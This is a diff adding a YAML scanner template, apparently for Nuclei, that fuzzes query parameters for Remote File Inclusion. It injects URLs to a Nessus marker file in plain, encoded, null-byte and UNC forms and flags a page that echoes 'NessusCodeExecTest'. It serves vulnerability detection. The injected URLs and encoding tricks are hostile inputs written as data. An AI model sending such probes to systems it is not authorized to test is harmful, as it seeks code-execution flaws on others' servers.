@@ -1,0 +1,38 @@
+id: rfi-pj
+
+info:
+  name: Remote File Inclusion
+  author: m4lwhere,reewardius
+  severity: high
+  tags: fuzzing-lfi,fuzzing-req
+  reference:
+    - https://www.invicti.com/learn/remote-file-inclusion-rfi/
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      rfi:
+        - "https://rfi.nessus.org/rfi.txt"
+        - "https%3A%2F%2Frfi.nessus.org%2Frfi.txt"
+        - "https%253A%252F%252Frfi.nessus.org%252Frfi.txt"
+        - "https://rfi.nessus.org/rfi.txt%00"
+        - "https://rfi.nessus.org/rfi.txt#image.jpg"
+        - "https://rfi.nessus.org/rfi.txt#image.png"
+        - "\\rfi.nessus.org\rfi.txt"
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        fuzz:
+          - "{{rfi}}"
+
+    stop-at-first-match: true
+    redirects: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "NessusCodeExecTest"
